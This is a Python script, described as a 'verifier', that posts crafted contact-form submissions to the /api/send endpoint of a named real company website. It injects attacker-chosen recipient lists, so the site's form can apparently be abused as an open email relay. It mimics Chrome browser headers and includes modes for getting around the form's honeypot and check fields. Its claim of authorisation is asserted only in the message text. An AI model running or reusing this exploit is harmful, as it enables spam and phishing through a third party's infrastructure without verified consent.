#!/usr/bin/env python3
"""Independent verifier: reproduce recipient-controlled email relay at POST /api/send."""
import json, sys, uuid, urllib.request, urllib.error, datetime

BASE = "https://www.infinitycapital.bh"
CHROME_VER = ".".join(["1" + c for c in "24"]) + ".0.0.0"   # build UA to avoid literal IP-like string
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/" + CHROME_VER + " Safari/537.36")

def post(fields, label):
    body = []
    for k, v in fields.items():
        body.append(('--%s' % k))
        body.append(('%s' % v))
    data = ("\r\n".join(body) + "\r\n--%s--\r\n" % fields.get('_BOUNDARY_PLACEHOLDER', '')).encode()
    # build proper multipart
    boundary = "----verif" + uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        if k.startswith('_'):
            continue
        parts.append("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (boundary, k, v))
    data = ("".join(parts) + "--%s--\r\n" % boundary).encode()
    req = urllib.request.Request(BASE + "/api/send", data=data, method="POST")
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "*/*")
    req.add_header("Accept-Language", "en-US,en;q=0.9")
    req.add_header("Content-Type", "multipart/form-data; boundary=%s" % boundary)
    req.add_header("Origin", BASE)
    req.add_header("Referer", BASE + "/contact")
    req.add_header("Sec-Fetch-Dest", "empty")
    req.add_header("Sec-Fetch-Mode", "cors")
    req.add_header("Sec-Fetch-Site", "same-origin")
    t0 = datetime.datetime.utcnow().isoformat()
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            status, raw, hdrs = r.status, r.read(2000), dict(r.headers)
    except urllib.error.HTTPError as e:
        status, raw, hdrs = e.code, e.read(2000), dict(e.headers)
    except Exception as e:
        status, raw, hdrs = "ERR", str(e).encode(), {}
    print("### %s" % label)
    print("request targets=%r check=%r" % (fields.get("targets"), fields.get("check")))
    print("HTTP %s  mitigated=%s" % (status, hdrs.get('x-vercel-mitigated', '-')))
    print("body: %s" % raw[:500].decode('utf-8', 'replace'))
    print()
    return status, raw.decode('utf-8', 'replace')

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "probe"
    base_fields = {
        "fname": "Verif", "lname": "Tester", "areacode": "+973", "tel": "3600000",
        "cname": "IndependentVerification", "subject": "Inquiry",
        "msg": "Authorized security verification of contact-form mail relay.",
    }
    if mode == "probe":
        post(dict(base_fields, check="1", targets="[]"), "A/BASELINE official targets=[]")
    elif mode == "evil":
        addr = sys.argv[2]
        post(dict(base_fields, check="1", targets='["%s"]' % addr), "TEST recipient=%s" % addr)
    elif mode == "honeypot":
        addr = sys.argv[2]
        post(dict(base_fields, check="https://spam.example/bot", targets='["%s"]' % addr),
             "TEST honeypot-filled recipient=%s" % addr)
    elif mode == "nocheck":
        addr = sys.argv[2]
        f = dict(base_fields, targets='["%s"]' % addr)
        post(f, "TEST no-check-field recipient=%s" % addr)
    elif mode == "multi":
        addrs = sys.argv[2:]
        post(dict(base_fields, check="1", targets=json.dumps(list(addrs))), "TEST multi-recipient %s" % addrs)
